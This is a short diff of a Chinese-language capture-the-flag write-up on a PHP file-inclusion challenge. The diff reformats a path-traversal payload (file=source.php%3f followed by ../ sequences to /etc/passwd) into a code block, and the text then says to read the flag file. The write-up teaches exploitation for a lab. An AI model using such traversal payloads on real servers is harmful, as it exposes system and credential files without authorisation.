@@ -92,7 +92,12 @@ if (! empty($_REQUEST['file'])
 ```
 
 只要我们构造的参数满足上述步骤绕过：
-`file=source.php%3f../../../../../../../../../../../../etc/passwd`，然后根据题目提示读取flag文件。
+
+```
+file=source.php%3f../../../../../../../../../../../../etc/passwd
+```
+
+然后根据题目提示读取flag文件。
 
 ![XroGifUcBNMdsPz.png](https://image.yjs2635.xyz/images/2022/02/20/XroGifUcBNMdsPz.png)
 
